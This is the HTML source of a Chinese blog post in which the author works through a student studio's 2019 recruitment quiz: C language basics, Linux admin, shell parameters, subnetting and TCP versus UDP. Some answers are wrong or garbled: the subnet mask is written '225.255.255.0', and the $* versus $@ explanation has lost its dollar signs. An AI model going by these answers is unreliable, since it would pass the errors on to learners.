@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="声明  以下浅析仅为个人见解，如有不同意见，欢迎各路大神前来探讨，大家共同进步基础题部分0x01  1000G硬盘容量相当于1000M硬盘的多少倍？常规思路 1024对，没错，理论上按照计算机容量标准，各级之间相差2的10次方，也就是1024。但是硬盘制作商，为了生产方便，潜规则的就把1024约等于了1000。所以就有不同观点了，理论上是1024没错，但实际上这个值更接近1000。不黑，也不吹 有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="智邮普创工作室2019秋季纳新题 (运维安全方向)浅析">
+<meta property="og:url" content="http://yoursite.com/2020/02/12/%E6%99%BA%E9%82%AE%E6%99%AE%E5%88%9B%E5%B7%A5%E4%BD%9C%E5%AE%A42019%E7%A7%8B%E5%AD%A3%E7%BA%B3%E6%96%B0%E9%A2%98%20(%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E6%96%B9%E5%90%91)%E6%B5%85%E6%9E%90/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="声明  以下浅析仅为个人见解，如有不同意见，欢迎各路大神前来探讨，大家共同进步基础题部分0x01  1000G硬盘容量相当于1000M硬盘的多少倍？常规思路 1024对，没错，理论上按照计算机容量标准，各级之间相差2的10次方，也就是1024。但是硬盘制作商，为了生产方便，潜规则的就把1024约等于了1000。所以就有不同观点了，理论上是1024没错，但实际上这个值更接近1000。不黑，也不吹 有">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013210944339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013211053600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013211712461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013212829467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013213956152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019101321453839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013215340896.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013215423690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013215437359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013220029356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013221126829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013222433693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013222900511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013224213472.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013225554311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013225717542.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013231424898.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013231452776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013231519206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013231544825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013232107398.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013232320623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013232505796.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013233959913.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013234539181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013234748989.png">
+<meta property="article:published_time" content="2020-02-12T06:11:38.458Z">
+<meta property="article:modified_time" content="2020-02-12T09:47:36.527Z">
+<meta property="article:author" content="小灰灰">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20191013210944339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/12/智邮普创工作室2019秋季纳新题 (运维安全方向)浅析/"/>
+
+
+
+
+
+  <title>智邮普创工作室2019秋季纳新题 (运维安全方向)浅析 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/12/%E6%99%BA%E9%82%AE%E6%99%AE%E5%88%9B%E5%B7%A5%E4%BD%9C%E5%AE%A42019%E7%A7%8B%E5%AD%A3%E7%BA%B3%E6%96%B0%E9%A2%98%20(%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E6%96%B9%E5%90%91)%E6%B5%85%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小灰灰">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">智邮普创工作室2019秋季纳新题 (运维安全方向)浅析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-12T14:11:38+08:00">
+                2020-02-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%9D%82%E5%BD%95/" itemprop="url" rel="index">
+                    <span itemprop="name">学习杂录</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="声明-以下浅析仅为个人见解，如有不同意见，欢迎各路大神前来探讨，大家共同进步"><a href="#声明-以下浅析仅为个人见解，如有不同意见，欢迎各路大神前来探讨，大家共同进步" class="headerlink" title="声明  以下浅析仅为个人见解，如有不同意见，欢迎各路大神前来探讨，大家共同进步"></a>声明  以下浅析仅为个人见解，如有不同意见，欢迎各路大神前来探讨，大家共同进步</h2><h3 id="基础题部分"><a href="#基础题部分" class="headerlink" title="基础题部分"></a>基础题部分</h3><h5 id="0x01-1000G硬盘容量相当于1000M硬盘的多少倍？"><a href="#0x01-1000G硬盘容量相当于1000M硬盘的多少倍？" class="headerlink" title="0x01  1000G硬盘容量相当于1000M硬盘的多少倍？"></a>0x01  1000G硬盘容量相当于1000M硬盘的多少倍？</h5><p>常规思路 1024<br>对，没错，理论上按照计算机容量标准，各级之间相差2的10次方，也就是1024。但是硬盘制作商，为了生产方便，潜规则的就把1024约等于了1000。所以就有不同观点了，理论上是1024没错，但实际上这个值更接近1000。<br><strong>不黑，也不吹</strong></p>
+<h6 id="有图有证据"><a href="#有图有证据" class="headerlink" title="有图有证据"></a>有图有证据</h6><p><img src="https://img-blog.csdnimg.cn/20191013210944339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h5><p><img src="https://img-blog.csdnimg.cn/20191013211053600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先给出答案  <strong>-2147483648</strong><br>int所占4个字节，32个比特位(0,1组合)，而2147483647 刚好是2的31次方再减1，最高位表示符号位，所以这里再加1时，会产生溢出。至于溢出后为什么等于-2147483648，这里涉及一个溢出后的运算，有兴趣的读者可以自行尝试或百度。</p>
+<h5 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h5><p><img src="https://img-blog.csdnimg.cn/20191013211712461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先给出答案  <strong>3，9，8</strong><br>本题考查运算的优先级，还有x++，与++x区别<br>这题有两处需要注意的地方。一来在括号里是封闭运算，所以无论是先取值后运算还是先运算后取值，均不影响最终结果。<br>所以对于y 来说 y=(++x)+(x++)+(++x)<br>第一项为2，第二项为3，第一项为4<br>加起来和为9<br>z同理</p>
+<h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h5><p><img src="https://img-blog.csdnimg.cn/20191013212829467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先给出答案 <strong>1，2</strong><br>本题考查函数在调用运行时的内存机制<br>函数作用是想交换a，b的值<br>但是函数在被调用时是先放在栈中执行，执行完后释放栈中内存<br>所以不改变主函数中a，b的值<br>笔者在面试过程中，曾被要求现场更改，使其具备交换a，b数值的作用<br>方法一 不调用函数，直接在主函数中用中间变量进行交换<br>方法二 利用指针，进行交换</p>
+<h5 id="0x05-你用过strlen和sizeof函数吗？它们的作用是什么？它们的区别又是什么？"><a href="#0x05-你用过strlen和sizeof函数吗？它们的作用是什么？它们的区别又是什么？" class="headerlink" title="0x05  你用过strlen和sizeof函数吗？它们的作用是什么？它们的区别又是什么？"></a>0x05  你用过strlen和sizeof函数吗？它们的作用是什么？它们的区别又是什么？</h5><p>这里引用朋友的一篇博客<br>链接如下<br><a href="https://blog.csdn.net/yangyanxi1216/article/details/90405564" target="_blank" rel="noopener">小羊的博客
+</a><br><img src="https://img-blog.csdnimg.cn/20191013213956152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="0x06-你所了解过的循环有哪些？它们有什么区别呢？"><a href="#0x06-你所了解过的循环有哪些？它们有什么区别呢？" class="headerlink" title="0x06 你所了解过的循环有哪些？它们有什么区别呢？"></a>0x06 你所了解过的循环有哪些？它们有什么区别呢？</h5><p>这题就相对来说比较简单了，具体三大循环—for，while，do…while…..<br>在此不再阐述</p>
+<h5 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h5><p><img src="https://img-blog.csdnimg.cn/2019101321453839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先给出答案 <strong>24</strong><br>如果没有基础的话，先看下面博客，有基础的话可以直接跳过<br><a href="https://blog.csdn.net/yangyanxi1216/article/details/90405564" target="_blank" rel="noopener">小羊的博客</a><br><img src="https://img-blog.csdnimg.cn/20191013215340896.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191013215423690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191013215437359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>就本题来看的话<br>这里结构体里嵌套了一层联合体，联合体为4，char和int在一起为8，double为8<br>因为内存空间要对其所以联合体补齐到8，加在一起为24。<br>笔者当时在面试时，还被问到存不存在内存不需要补齐的情况。这个问题放在这，有兴趣的可以找我讨论</p>
+<h5 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h5><p><img src="https://img-blog.csdnimg.cn/20191013220029356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先给出答案 <strong>ZYPC</strong><br>这题考查二维数组下标越界问题。<br>二维数组可以看成一维数组的一维数组，而且其在存储过程中，在内存空间中是紧挨着的，这样描述可能不太形象，其实就是地址是连续的。<br>以ch[0][18]为例<br>先找到ch[0][0],然后在往后推18个即可，其他同理。<br>但是这个具体好像有什么公式可以直接推出<br>有兴趣的同学可以自行百度啦。。。</p>
+<h5 id="0x09-尽可能多的说出你所了解的排序算法，它们的时间复杂度和稳定性又如何？"><a href="#0x09-尽可能多的说出你所了解的排序算法，它们的时间复杂度和稳定性又如何？" class="headerlink" title="0x09  尽可能多的说出你所了解的排序算法，它们的时间复杂度和稳定性又如何？"></a>0x09  尽可能多的说出你所了解的排序算法，它们的时间复杂度和稳定性又如何？</h5><p>emmmmmmm，算法是我软肋。<br>但我觉得，几个常用的排序算法还是要了解的。<br>冒泡排序<br>选择排序<br>快速排序<br>。。。。。<br>自行百度补充<br>笔者面试时被要求现场写出冒泡排序的核心算法，然后就gg了<br>。。。。。。。。<br><strong>其实算法还是很重要的</strong></p>
+<h5 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h5><p><img src="https://img-blog.csdnimg.cn/20191013221126829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>本题考查结构体成员的访问<br>先给出如下两种方式<br>1 s.b<br>2 pt-&gt;b</p>
+<h3 id="方向题部分-运维-amp-安全"><a href="#方向题部分-运维-amp-安全" class="headerlink" title="方向题部分(运维&amp;安全)"></a>方向题部分(运维&amp;安全)</h3><p><del>因为笔者主要安全方向更熟悉一点，运维并不是特别熟悉，以防误人子弟，在此温馨提示，读者可自行跳过，或直接请教度娘，键盘侠请绕路</del> </p>
+<h5 id="0x01-Linux如何新建用户，并设置为管理员？"><a href="#0x01-Linux如何新建用户，并设置为管理员？" class="headerlink" title="0x01 Linux如何新建用户，并设置为管理员？"></a>0x01 Linux如何新建用户，并设置为管理员？</h5><p>新建用户adduser，在此过程中会有选项可以加入root组(0)，但此时并不是管理员，有些权限还是不够，然后百度了一下，需要修改/etc/sudoers这个文件<br><img src="https://img-blog.csdnimg.cn/20191013222433693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>按照上图改一下<br>不同linux系统版本可能会略有不同</p>
+<h5 id="0x02-CentOS-、Debian如何设置静态IP地址、配置本地镜像为源。"><a href="#0x02-CentOS-、Debian如何设置静态IP地址、配置本地镜像为源。" class="headerlink" title="0x02 CentOS 、Debian如何设置静态IP地址、配置本地镜像为源。"></a>0x02 CentOS 、Debian如何设置静态IP地址、配置本地镜像为源。</h5><p>进入到网卡配置目录<br>cd /etc/sysconfig/network-scripts/<br>ifconfig查看网卡信息并获取到网卡的名称位eth0<br><img src="https://img-blog.csdnimg.cn/20191013222900511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找到eth0的配置文件ifcfg-ens32 修改如下<br>vim ifcfg-ens32</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line"></span><br><span class="line">PROXY_METHOD=none</span><br><span class="line"></span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line"></span><br><span class="line">BOOTPROTO=static       <span class="comment">#设置为静态地址</span></span><br><span class="line"></span><br><span class="line">IPADDR=192.168.1.149</span><br><span class="line"></span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line"></span><br><span class="line">GATEWAY=192.168.1.1</span><br><span class="line"></span><br><span class="line">DEFROUTE=yes</span><br><span class="line"></span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line"></span><br><span class="line">IPV6INIT=yes</span><br><span class="line"></span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line"></span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line"></span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line"></span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line"></span><br><span class="line">NAME=ens32</span><br><span class="line"></span><br><span class="line">UUID=d16fe359-9256-4414-a557-19d751b4fc72</span><br><span class="line"></span><br><span class="line">DEVICE=ens32</span><br><span class="line"></span><br><span class="line">ONBOOT=yes        <span class="comment"># 网络开机运行</span></span><br><span class="line"></span><br><span class="line">:wq!                    <span class="comment">#退出并保存</span></span><br></pre></td></tr></table></figure>
+
+
+<p>重启网卡</p>
+<p>systemctl restart network</p>
+<p>这里比较戏剧性的的是<br>笔者当时被一位运维学长问到你还知道其他方法吗。。。<br>当场就懵了。。<br>技不如人<br>然后gg<br>Debian与其配置类似，只是配置文件位置不同罢了<br>对于配置本地镜像为源，笔者是没接触过<br>因为一直用的kali，工具都是集成好的，平时运维接触又不多，也没有这些资源，所以就再次gg了<br>读者自行百度就好了。。。</p>
+<h5 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h5><p><img src="https://img-blog.csdnimg.cn/20191013224213472.png" alt="在这里插入图片描述"><br>这题笔者没被问到，直接给答案吧，写脚本中会遇到<br><img src="https://img-blog.csdnimg.cn/20191013225554311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>相同点：都是引用所有参数<br>不同点：只有在双引号中体现出来。假设在脚本运行时写了三个参数（分别存储在12 3）则”*” 等价于 “12 3”（传递了一个参数）；而“@” 等价于 “1””2” “$3”（传递了三个参数）</p>
+<h5 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h5><p><img src="https://img-blog.csdnimg.cn/20191013225717542.png" alt="在这里插入图片描述"><br>这题笔者也没有被问到，只是问了一些网络协议方面的知识。<br>先给出答案 子网掩码 225.255.255.0<br>                     网络地址 193.6.7.0<br>                     广播地址 193.6.7.255<br>                     有效主机位 254<br>/24表示网络位为24个比特，剩下8个比特位为主机位(相当于是一个c段网络)<br>有效主机位：2的8次方，再减去网络位与广播地址，即254</p>
+<h5 id="0x05-常见的应用中有哪些是应用TCP协议的，哪些又是应用UDP协议的，为什么它们被如此设计？（以QQ为例说明）"><a href="#0x05-常见的应用中有哪些是应用TCP协议的，哪些又是应用UDP协议的，为什么它们被如此设计？（以QQ为例说明）" class="headerlink" title="0x05 常见的应用中有哪些是应用TCP协议的，哪些又是应用UDP协议的，为什么它们被如此设计？（以QQ为例说明）"></a>0x05 常见的应用中有哪些是应用TCP协议的，哪些又是应用UDP协议的，为什么它们被如此设计？（以QQ为例说明）</h5><p>本题考查TCP与UDP的区别<br>TCP与UDP区别总结：<br>1、TCP面向连接（如打电话要先拨号建立连接）;UDP是无连接的，即发送数据之前不需要建立连接<br>2、TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达;UDP尽最大努力交付，即不保证可靠交付Tcp通过校验和，重传控制，序号标识，滑动窗口、确认应答实现可靠传输。如丢包时的重发控制，还可以对次序乱掉的分包进行顺序控制<br>3、UDP具有较好的实时性，工作效率比TCP高，适用于对高速传输和实时性有较高的通信或广播通信<br>4.每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信<br>5、TCP对系统资源要求较多，UDP对系统资源要求较少。<br>所以以qq为例，支付功能需要安全可靠，要用TCP。语音通话和视频聊天对即时性要求比较高，所以会用到UDP</p>
